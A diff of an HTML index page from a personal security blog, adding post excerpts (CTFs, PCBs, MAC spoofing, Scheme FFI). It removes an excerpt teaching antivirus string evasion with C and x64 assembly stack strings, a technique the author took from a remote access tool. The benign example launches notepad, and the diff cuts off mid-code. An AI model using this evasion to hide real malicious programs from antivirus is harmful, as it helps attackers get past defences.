@@ -4,937 +4,331 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>AccidentalRebel.com - Articles by AccidentalRebel</title>
-    
+
+    <meta name="description" content="SOC leader and content engineer at TryHackMe. Writing about AI, security tools, malware analysis, and reverse engineering.">
+
+    <link rel="canonical" href="../">
+
     <link href="https://www.accidentalrebel.com/feeds/all.atom.xml" type="application/atom+xml" rel="alternate" title="AccidentalRebel.com Atom Feed" />
-    
+
     <link rel="stylesheet" href="../theme/css/main.css">
-    
+
+    <script type="application/ld+json">
+    {
+        "@context": "https://schema.org",
+        "@type": "Person",
+        "name": "AccidentalRebel",
+        "url": "..",
+        "sameAs": ["https://www.linkedin.com/in/juan-karlo-licudine/", "https://github.com/accidentalrebel"]
+    }
+    </script>
+
 </head>
 <body>
+    <div class="rebel-stripe"></div>
     <div class="progress-bar" id="progress"></div>
-    
+
     <header>
-        <div class="container">
+        <div class="container-wide">
             <nav>
-                <a href="../" class="site-title">AccidentalRebel.com</a>
+                <a href="../" class="site-title">Accidental<span class="rebel">Rebel</span>.com</a>
                 <button class="menu-toggle" onclick="toggleMenu()">☰</button>
                 <ul class="nav-links" id="navLinks">
                     <li><a href="../archives.html">Archives</a></li>
                     <li><a href="../categories.html">Categories</a></li>
                     <li><a href="../tags.html">Tags</a></li>
+                            <li><a href="../category/cybersecurity-x-ai-news-roundup.html">Newsletter</a></li>
+                            <li><a href="../pages/about.html">About</a></li>
                 </ul>
             </nav>
         </div>
     </header>
 
-    <!-- Comic strip divider -->
-    <div class="comic-container">
-        <div class="comic-strip"></div>
-    </div>
-
     <main>
-        <div class="container">
+        <div class="container-wide">
+            <div class="layout">
+                <div class="content">
     <article class="post-item">
         <header class="article-header">
+            <a href="../category/ctf.html" class="article-category-label">ctf</a>
             <h2 class="post-title">
-                <a href="../string-av-evasion-in-x64-assembly-part-1.html">String anti-virus evasion in x64 assembly (Part 1)</a>
+                <a href="../hunt-the-kingdom-ctf-challenge.html">Hunt the Kingdom CTF Challenge</a>
             </h2>
             <div class="article-meta">
-                <time datetime="2022-07-08T12:11:00+08:00">Fri 08 July 2022</time>
-                <span>•</span>
-                <a href="../category/misc.html">misc</a>
+                <time datetime="2020-10-05T11:13:00+08:00">Mon 05 October 2020</time>
             </div>
         </header>
 
         <div class="article-content">
-            <p>One of the features I implemented for my <a href="https://github.com/accidentalrebel/RATwurst">Remote Access Tool</a> was an anti-virus evasion capability in the form of strings obfuscation. It wouldn't fool an EDR or a reverse engineer but it was quick to implement so I added it. </p>
-<p>This was over a year ago. I decided to revisit this feature to try and understand it better and find out if it is actually effective.</p>
-<h2 id="what-to-expect">What to expect</h2>
-<p>In this two-part blog post I will look into the following:</p>
-<ul>
-<li>Hiding argument strings</li>
-<li>Hiding API call strings</li>
-</ul>
-<p>THe one you reading now is about the first one. I will be explaining how it's done in C and later convert it to x64 Windows Assembly so we can better understand what's happening under the hood.</p>
-<h2 id="hiding-function-argument-strings">Hiding function argument strings</h2>
-<p>I got the idea for this AV evasion technique from <a href="https://blog.scrt.ch/2020/06/19/engineering-antivirus-evasion/">this blog post</a>. The author posits that one part of an anti-virus detection capability is through checking for suspicious strings in an executable.</p>
-<p>For the purpose of this post, let's pretend that "notepad" is a suspicious string that we don't want be detected by the anti-virus.</p>
-<div class="codehilite"><pre><span></span><code><span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;windows.h&gt;</span>
-<span class="cp">#include</span><span class="w"> </span><span class="cpf">&lt;shellapi.h&gt;</span>
+            <blockquote>
+<p>TLDR: Participated in a blue team CTF, had a lot of fun, looking forward for more</p>
+</blockquote>
+<p>Yesterday I participated in the <a href="https://www.facebook.com/guidemtraining">GuideM "Hunt the Kingdom" CTF challenge</a>. It served as the final activity at the end of the <em>"Cyber Defense and Threat Hunting"</em> course.</p>
+<p>I was looking forward to this CTF, especially after my awesome experience with the <a href="../covidscammers-writeup--defcon-rtv-ctf.html">Red Team Village CTF at Defcon</a>. This one is centered on the Blue Team side, and I was curious as to how it will play out.</p>
+<h2 id="the-preparation">The Preparation</h2>
+<p>I took one whole day to study and prepare. I went through all our slides and have written down the important concepts and commands to an org file. This is important because I wanted them to be easily searchable, which helped a lot during the challenge.</p>
+<p>I also did research about the Hunt the Kingdom challenge itself. There weren't much information online about it …</p>
+            <a href="../hunt-the-kingdom-ctf-challenge.html" class="read-more">Read more &rarr;</a>
+        </div>
 
-<span class="kt">int</span><span class="w"> </span><span class="nf">main</span><span class="p">(</span><span class="kt">void</span><span class="p">)</span>
+        <div class="tags">
+            <a href="../tag/ctf.html" class="tag">ctf</a>
+            <a href="../tag/cybersecurity.html" class="tag">cybersecurity</a>
+        </div>
+    </article>
+    <article class="post-item">
+        <header class="article-header">
+            <a href="../category/electronics.html" class="article-category-label">electronics</a>
+            <h2 class="post-title">
+                <a href="../my-experience-manufacturing-printed-circuit-boards.html">My experience with manufacturing printed circuit boards</a>
+            </h2>
+            <div class="article-meta">
+                <time datetime="2020-10-01T07:19:00+08:00">Thu 01 October 2020</time>
+            </div>
+        </header>
+
+        <div class="article-content">
+            <p>I've done a lot of electronics projects already, all of them were painstakingly hand-soldered on a perfboard. I actually like this approach for quick prototyping, and plus, I've also grown fond of how "raw" it looks like. In spite of this, I've always been curious and interested in having my own printed PCB. I remember designing one for my <a href="https://hackaday.io/project/164144-tiro-vibrating-watch/log/161430-current-state-and-next-steps">TIRO vibrating watch</a> but I never pushed through with it because I wasn't confident with what I've made.</p>
+<p><img alt="my-experience-manufacturing-printed-circuit-boards-01" src="../images/my-experience-manufacturing-printed-circuit-boards-01.jpg" /></p>
+<div class="codehilite"><pre><span></span><code>I really like the raw, almost electronic-punk look of my work
+</code></pre></div>
+
+<p>A couple of months ago I got an email from <a href="https://www.pcbway.com/">PCBWay</a> asking if I was interested in trying out their PCB manufacturing service. The email from PCBWay re-ignited this interest in having a PCB made. The problem is I didn't have a PCB design that I built myself that I knew was going to work. My best option was the "ESPBoy project …</p>
+            <a href="../my-experience-manufacturing-printed-circuit-boards.html" class="read-more">Read more &rarr;</a>
+        </div>
+
+        <div class="tags">
+            <a href="../tag/pcbs.html" class="tag">pcbs</a>
+            <a href="../tag/electronics.html" class="tag">electronics</a>
+        </div>
+    </article>
+    <article class="post-item">
+        <header class="article-header">
+            <a href="../category/ctf.html" class="article-category-label">ctf</a>
+            <h2 class="post-title">
+                <a href="../covidscammers-writeup--defcon-rtv-ctf.html">CovidScammers writeup (Defcon RTV CTF)</a>
+            </h2>
+            <div class="article-meta">
+                <time datetime="2020-08-13T16:58:00+08:00">Thu 13 August 2020</time>
+            </div>
+        </header>
+
+        <div class="article-content">
+            <p>I joined the <a href="https://ctf.threatsims.com">Defcon Red Team Village CTF</a> because I was curious about it and I wanted to test out the skills that I have gained playing with CTF sites like <a href="https://overthewire.org/wargames/">overthewire.org</a> and <a href="https://www.vulnhub.com/">vulnhub</a>. I knew that the challenges won't be easy, but thankfully, I was able to join up with other newbies who were willing to give it a go and learn with each other.</p>
+<p>Unfortunately, I fell asleep just before the CTF started and when I woke up all the easy challenges were already solved by my team members. There was one easy challenge that was still open on the CovidScammers category, so I quickly got started to solving that.</p>
+<h2 id="free-flag-and-binary-1-point">Free Flag (and binary) [1 point]</h2>
+<blockquote>
+<p>You've been contacted by a high-end but morally ambiguous finance company (unhackable-bitcoin-wallet.com) to investigate a data breach. The box in question is a mail server in their internal network, a …</p></blockquote>
+            <a href="../covidscammers-writeup--defcon-rtv-ctf.html" class="read-more">Read more &rarr;</a>
+        </div>
+
+        <div class="tags">
+            <a href="../tag/ctf.html" class="tag">ctf</a>
+            <a href="../tag/writeup.html" class="tag">writeup</a>
+            <a href="../tag/malware_analysis.html" class="tag">malware_analysis</a>
+            <span class="tag">+1 more</span>
+        </div>
+    </article>
+    <article class="post-item">
+        <header class="article-header">
+            <a href="../category/cybersecurity.html" class="article-category-label">cybersecurity</a>
+            <h2 class="post-title">
+                <a href="../study-notes--mac-spoofing.html">Study notes: MAC Spoofing</a>
+            </h2>
+            <div class="article-meta">
+                <time datetime="2020-08-01T11:07:00+08:00">Sat 01 August 2020</time>
+            </div>
+        </header>
+
+        <div class="article-content">
+            <div class="codehilite"><pre><span></span><code>Study notes are my personal research notes on certain topics that interests me.
+</code></pre></div>
+
+<p>Any network capable device has a unique factory-assigned Media Access Control (MAC) address. Users have no way to change the MAC address but it can be done. However, it is possible to mask the MAC address and have it show a different value. This is called MAC spoofing.</p>
+<p>There are legitimate uses for MAC spoofing. For example, there may be certain applications that require a particular MAC address to work, or maybe your ISP expects a certain MAC address to connect to the network. MAC spoofing is largely used for illegitimate uses, like circumventing an access control list or getting past a filter on a wireless network.</p>
+<h2 id="changing-mac-address-via-ifconfig">Changing MAC Address via ifconfig</h2>
+<p>In Linux we could use <code>ifconfig</code> to change the MAC address.</p>
+<p>To view the current MAC address:</p>
+<div class="codehilite"><pre><span></span><code>$<span class="w"> </span>ifconfig
+</code></pre></div>
+
+<p>The current MAC address is <code>08:00 …</code></p>
+            <a href="../study-notes--mac-spoofing.html" class="read-more">Read more &rarr;</a>
+        </div>
+
+        <div class="tags">
+            <a href="../tag/spoofing.html" class="tag">spoofing</a>
+            <a href="../tag/cybersecurity.html" class="tag">cybersecurity</a>
+        </div>
+    </article>
+    <article class="post-item">
+        <header class="article-header">
+            <a href="../category/dev.html" class="article-category-label">dev</a>
+            <h2 class="post-title">
+                <a href="../chicken-scheme-ffi-examples.html">Chicken-Scheme FFI Examples</a>
+            </h2>
+            <div class="article-meta">
+                <time datetime="2020-06-16T05:58:00+08:00">Tue 16 June 2020</time>
+            </div>
+        </header>
+
+        <div class="article-content">
+            <p>I'm currently working on refactoring the FFI implementation for <a href="https://github.com/accidentalrebel/rebel-game-engine">the Rebel Game Engine</a>. It was previously written using the <a href="http://wiki.call-cc.org/eggref/5/bind">Bind chicken egg</a> but I wanted to have more control over the implementation by using the low level foreign functions. </p>
+<p>To help me better understand I made some examples that has the basic FFI implementations that I'll be needing for my project.</p>
+<hr />
+<h2 id="foreign-lambda-example">foreign-lambda example</h2>
+<p>Let's say we have a structure <code>Vec3</code> and a function <code>Vec3Create</code> that we want to access from chicken-scheme.</p>
+<div class="codehilite"><pre><span></span><code><span class="k">typedef</span><span class="w"> </span><span class="k">struct</span><span class="w"> </span><span class="nc">Vec3</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="kt">float</span><span class="w"> </span><span class="n">x</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">float</span><span class="w"> </span><span class="n">y</span><span class="p">;</span>
+<span class="w">    </span><span class="kt">float</span><span class="w"> </span><span class="n">z</span><span class="p">;</span>
+<span class="p">}</span><span class="w"> </span><span class="n">Vec3</span><span class="p">;</span>
+
+<span class="n">Vec3</span><span class="o">*</span><span class="w"> </span><span class="nf">Vec3Create</span><span class="p">(</span><span class="kt">float</span><span class="w"> </span><span class="n">x</span><span class="p">,</span><span class="w"> </span><span class="kt">float</span><span class="w"> </span><span class="n">y</span><span class="p">,</span><span class="w"> </span><span class="kt">float</span><span class="w"> </span><span class="n">z</span><span class="p">)</span>
 <span class="p">{</span>
-<span class="w">    </span><span class="n">ShellExecute</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;open&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;notepad&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">SW_SHOW</span><span class="p">);</span>
+<span class="w">    </span><span class="n">Vec3</span><span class="o">*</span><span class="w"> </span><span class="n">v</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">(</span><span class="n">Vec3</span><span class="o">*</span><span class="p">)</span><span class="n">malloc</span><span class="p">(</span><span class="k">sizeof</span><span class="p">(</span><span class="n">Vec3</span><span class="p">));</span>
+<span class="w">    </span><span class="n">v</span><span class="o">-&gt;</span><span class="n">x</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">x</span><span class="p">;</span>
+<span class="w">    </span><span class="n">v</span><span class="o">-&gt;</span><span class="n">y</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">y</span><span class="p">;</span>
+<span class="w">    </span><span class="n">v</span><span class="o">-&gt;</span><span class="n">z</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">z</span><span class="p">;</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="n">v</span><span class="p">;</span>
 <span class="p">}</span>
 </code></pre></div>
 
-<blockquote>
-<p>You might think that a call to <code>ShellExecute</code> is already a big red flag, and you are right. It is! But we'll talk about hiding API calls on the next post. Let's focus on the parameter for now.</p>
-</blockquote>
-<p>In the place of the anti-virus, we'll be using the <code>strings</code> command to check for visible strings like so:</p>
-<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-1-01" src="../images/string-anti-virus-evasion-in-x64-assembly-part-1-01.png" /></p>
-<p>As expected, the word "notepad" is easily detected. This is becaues any string that we declare and initialize in a program gets placed in the <code>.data</code> segment in memory by the compiler:</p>
-<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-1-02" src="../images/string-anti-virus-evasion-in-x64-assembly-part-1-02.png" /></p>
-<p>To prevent detection, we need a way for the string to not be present in our compiled executable.</p>
-<h2 id="the-solution">The solution</h2>
-<p>The solution is to declare the string to be passed as the parameter like so:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">ca_notepad</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="sc">&#39;n&#39;</span><span class="p">,</span><span class="sc">&#39;o&#39;</span><span class="p">,</span><span class="sc">&#39;t&#39;</span><span class="p">,</span><span class="sc">&#39;e&#39;</span><span class="p">,</span><span class="sc">&#39;p&#39;</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="sc">&#39;d&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
-<span class="w">    </span><span class="n">ShellExecute</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;open&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ca_notepad</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">SW_SHOW</span><span class="p">);</span>
-</code></pre></div>
-
-<p>And when <code>strings</code> is run, we now see that the "notepad" string is not present anymore.</p>
-<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-1-03" src="../images/string-anti-virus-evasion-in-x64-assembly-part-1-03.png" /></p>
-<p>How did this happen?</p>
-<p>This is because data contained in arrays are placed on the stack instead of the <code>.data</code> segment when declared within a function (And also, as long as it is not declared as static).</p>
-<p>To further understand how this happens, let's convert this C program into x64 assembly.</p>
-<h2 id="converting-to-x64-assembly">Converting to x64 assembly</h2>
-<p>First, we setup our boilerplate code with an entry point and a call to <code>ExitProcess</code>.</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">bits</span><span class="w"> </span><span class="mi">64</span>
-<span class="w">    </span><span class="nf">default</span><span class="w"> </span><span class="no">rel</span>
-
-<span class="nf">segment</span><span class="w"> </span><span class="no">.text</span>
-<span class="w">    </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ExitProcess</span>
-
-<span class="nl">main:</span>
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rbp</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w">     </span><span class="no">rbp</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
-
-<span class="w">    </span><span class="nf">xor</span><span class="w">     </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ExitProcess</span>
-</code></pre></div>
-
-<p>Before we can call <code>ShellExecute</code>, we first need to import the <code>ShellExecuteA</code> symbol using <code>extern</code>.</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.text</span>
-<span class="w">    </span><span class="na">...</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ExitProcess</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ShellExecuteA</span>
-</code></pre></div>
-
-<hr />
-<h3 id="aside-why-shellexecutea-and-not-shellexecute">Aside: Why ShellExecuteA and not ShellExecute?</h3>
-<blockquote>
-<p>Because if you would look in the <a href="https://docs.microsoft.com/en-us/windows/win32/api/shellapi/nf-shellapi-shellexecutea">MSDN documentation</a>, you would find that there really isn't a <code>ShellExecute</code> function available. There are <code>ShellExecuteA</code> (For ANSI strings) and <code>ShellExecuteW</code> (For Unicode strings), however. <code>ShellExecute</code> is just a macro for these two functions. We can confirm this by looking at the <code>shellapi.h</code> source code.</p>
-</blockquote>
-<div class="codehilite"><pre><span></span><code><span class="cp">#ifdef UNICODE</span>
-<span class="cp">#define ShellExecute  ShellExecuteW</span>
-<span class="cp">#else</span>
-<span class="cp">#define ShellExecute  ShellExecuteA</span>
-<span class="cp">#endif </span><span class="c1">// !UNICODE</span>
-</code></pre></div>
-
-<blockquote>
-<p>Since assembly does not use header files we can just call <code>ShellExecuteA</code> or <code>ShellExecuteW</code> directly. In this example, we won't be needing unicode support so we're going to be using the former.</p>
-</blockquote>
-<hr />
-<p>Before we call the function in assembly, let's go back and take a look at how we did it in C.</p>
-<div class="codehilite"><pre><span></span><code><span class="n">ShellExecute</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;open&quot;</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;notepad&quot;</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">SW_SHOW</span><span class="p">);</span>
-</code></pre></div>
-
-<p>We have 5 paremeters to pass to the function. Here's how we can write this in assembly using the Microsoft <a href="https://docs.microsoft.com/en-us/cpp/build/x64-calling-convention?view=msvc-170">x64 calling conventions</a>.</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="mi">0x5</span><span class="w">              </span><span class="c1">; nShowCmd ; SW_SHOW == 0x5</span>
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="mi">0x0</span><span class="w">              </span><span class="c1">; lpDirectory ; NULL == 0x0</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span><span class="w">               </span><span class="c1">; lpParameters ; Clear register == NULL</span>
-
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_notepad</span><span class="p">]</span><span class="w">    </span><span class="c1">; lpFile</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_open</span><span class="p">]</span><span class="w">      </span><span class="c1">; lpOperation</span>
-
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rcx</span><span class="w">             </span><span class="c1">; hwnd</span>
-
-<span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ShellExecuteA</span><span class="w">    </span><span class="c1">; Call function</span>
-<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
-</code></pre></div>
-
-<p>We then initialize the strings by adding a data segment section:</p>
-<div class="codehilite"><pre><span></span><code><span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
-<span class="w">    </span><span class="nf">msg_open</span><span class="w">    </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">open</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">msg_notepad</span><span class="w"> </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">notepad</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-</code></pre></div>
-
-<p>For reference, here is our full code so far:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">bits</span><span class="w"> </span><span class="mi">64</span>
-<span class="w">    </span><span class="nf">default</span><span class="w"> </span><span class="no">rel</span>
-
-<span class="nf">segment</span><span class="w"> </span><span class="no">.data</span>
-<span class="w">    </span><span class="nf">msg_open</span><span class="w">    </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">open</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-<span class="w">    </span><span class="nf">msg_notepad</span><span class="w"> </span><span class="no">db</span><span class="w">  </span><span class="err">&quot;</span><span class="no">notepad</span><span class="err">&quot;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span>
-
-<span class="nf">segment</span><span class="w"> </span><span class="no">.text</span>
-<span class="w">    </span><span class="nf">global</span><span class="w"> </span><span class="no">main</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ExitProcess</span>
-<span class="w">    </span><span class="nf">extern</span><span class="w"> </span><span class="no">ShellExecuteA</span>
-
-<span class="nl">main:</span>
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="no">rbp</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w">     </span><span class="no">rbp</span><span class="p">,</span><span class="w"> </span><span class="no">rsp</span>
-
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="mi">0x5</span>
-<span class="w">    </span><span class="nf">push</span><span class="w">    </span><span class="mi">0x0</span>
-<span class="w">    </span><span class="nf">xor</span><span class="w"> </span><span class="no">r9</span><span class="p">,</span><span class="w"> </span><span class="no">r9</span>
-
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_notepad</span><span class="p">]</span>
-<span class="w">    </span><span class="nf">lea</span><span class="w"> </span><span class="no">rdx</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">msg_open</span><span class="p">]</span><span class="w"> </span>
-<span class="w">    </span><span class="no">xor</span><span class="w"> </span><span class="no">rcx</span><span class="p">,</span><span class="w"> </span><span class="no">rcx</span><span class="w">    </span>
-
-<span class="w">    </span><span class="no">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ShellExecuteA</span>
-<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">32</span>
-
-<span class="w">    </span><span class="nf">xor</span><span class="w">     </span><span class="no">rax</span><span class="p">,</span><span class="w"> </span><span class="no">rax</span>
-<span class="w">    </span><span class="nf">call</span><span class="w">    </span><span class="no">ExitProcess</span>
-</code></pre></div>
-
-<p>Take note that this version of the code is still the one where the "notepad" string is detectable.</p>
-<p>To hide this string we need to apply the same solution we did to our C code; which is to place the data on the stack so that it would not be placed in the <code>.data</code> segment.</p>
-<p>Here is how we did it in C:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="kt">char</span><span class="w"> </span><span class="n">ca_notepad</span><span class="p">[]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="sc">&#39;n&#39;</span><span class="p">,</span><span class="sc">&#39;o&#39;</span><span class="p">,</span><span class="sc">&#39;t&#39;</span><span class="p">,</span><span class="sc">&#39;e&#39;</span><span class="p">,</span><span class="sc">&#39;p&#39;</span><span class="p">,</span><span class="sc">&#39;a&#39;</span><span class="p">,</span><span class="sc">&#39;d&#39;</span><span class="p">,</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="p">};</span>
-<span class="w">    </span><span class="n">ShellExecute</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span><span class="w"> </span><span class="s">&quot;open&quot;</span><span class="p">,</span><span class="w"> </span><span class="n">ca_notepad</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="nb">NULL</span><span class="p">,</span><span class="w"> </span><span class="n">SW_SHOW</span><span class="p">);</span>
-</code></pre></div>
-
-<p>And here is how to do it in assembly:</p>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w">             </span><span class="c1">; Reserve space on stack for string</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">n</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">o</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">2</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">t</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">3</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">e</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">4</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">p</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">5</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">a</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">6</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">d</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">7</span><span class="p">],</span><span class="w"> </span><span class="mi">0x0</span><span class="w">   </span>
-<span class="w">    </span><span class="no">lea</span><span class="w"> </span><span class="no">r8</span><span class="p">,</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">]</span><span class="w">          </span><span class="c1">; Load address of string to r8</span>
-<span class="w">    </span><span class="nf">add</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span><span class="w">             </span><span class="c1">; Reclaim space</span>
-</code></pre></div>
-
-<p>Here's a summary of the the above code:</p>
-<ul>
-<li>Since our string is 8 characters long (Including the <code>0x0</code> or <code>NULL</code> terminator), we reserve space on the stack with <code>sub rsp, 8</code>. </li>
-<li>Each character is then placed individually in the reserved space using <code>move byte</code> while adding an offset to <code>rsp</code>.</li>
-<li>The address pointed to by <code>rsp</code> is then loaded to the <code>r8</code> register (This holds our 3nd parameter).</li>
-<li>We reclaim our reserved space using <code>add rsp, 8</code>.</li>
-</ul>
-<p>After the code above, <code>r8</code> would now point to the location in the stack where our string resides:</p>
-<p><img alt="string-anti-virus-evasion-in-x64-assembly-part-1-04" src="../images/string-anti-virus-evasion-in-x64-assembly-part-1-04.png" /></p>
-<hr />
-<h3 id="aside-what-if-we-have-longer-strings">Aside: What if we have longer strings?</h3>
-<blockquote>
-<p>If we have a longer string like "powershell", then we need to reserve more space on the stack.
-Take note, however that when reserving space we need to maintain the <em>stack alignment</em> so we add and subtract by multiples of 8.
-The "powershell" string has 11 characters so we use 16.</p>
-</blockquote>
-<div class="codehilite"><pre><span></span><code><span class="w">    </span><span class="nf">sub</span><span class="w"> </span><span class="no">rsp</span><span class="p">,</span><span class="w"> </span><span class="mi">16</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">p</span><span class="err">&quot;</span>
-<span class="w">    </span><span class="nf">mov</span><span class="w"> </span><span class="no">byte</span><span class="w"> </span><span class="p">[</span><span class="no">rsp</span><span class="err">+</span><span class="mi">1</span><span class="p">],</span><span class="w"> </span><span class="err">&quot;</span><span class="no">o</span><span class="err">&quot;</span>
